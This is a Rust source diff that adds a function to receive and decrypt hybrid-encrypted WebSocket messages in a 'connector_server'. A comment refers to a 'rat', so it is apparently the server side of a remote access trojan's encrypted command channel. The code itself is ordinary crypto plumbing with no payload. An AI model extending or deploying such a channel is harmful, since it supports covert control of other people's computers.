@@ -12,8 +12,8 @@ use rsa::{
 use tokio_tungstenite::WebSocketStream;
 use tungstenite::Message;
 
-use super::hybrid_encryption::HybridEncryptionResult;
-use crate::connector_server::hybrid_encryption::{encrypt_data_combined, generate_private_key};
+use super::hybrid_crypto::{HybridDecryption, HybridEncryptionResult};
+use crate::connector_server::hybrid_crypto::{encrypt_data_combined, generate_private_key};
 #[derive(Debug)]
 #[allow(dead_code)]
 pub struct Instance {
@@ -92,6 +92,23 @@ impl Instance {
         self.send_message(hybrid_encryption_result.get_encrypted_data().as_str())
             .await;
     }
+    pub async fn accept_message(&mut self) -> Vec<u8> {
+        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
+        for index in 0..3 {
+            if let Some(message) = self.read.next().await {
+                //cant put hex decode in the decrypt fn cuz it cant accept
+                hybrid_decryption_arguments[index] =
+                    hex::decode(message.unwrap().to_string()).unwrap();
+            }
+        }
+        let hybrid_decryption = HybridDecryption::new(
+            hybrid_decryption_arguments[0].clone(),
+            hybrid_decryption_arguments[1].clone(),
+            hybrid_decryption_arguments[2].clone(),
+        );
+        hybrid_decryption.decrypt(self.private_key.clone().unwrap())
+    }
+
     pub async fn init_keys(&mut self) -> (String, String) {
         //Send pong for rat to generate a public key
         self.send_message("pong").await;
@@ -111,6 +128,7 @@ impl Instance {
             self.set_private_key(private_key.to_owned());
 
             //Send my public key encrypted by users public key to user and forget about it
+
             self.send_hybrid_encryption(
                 self.public_key.clone().unwrap(),
                 private_key
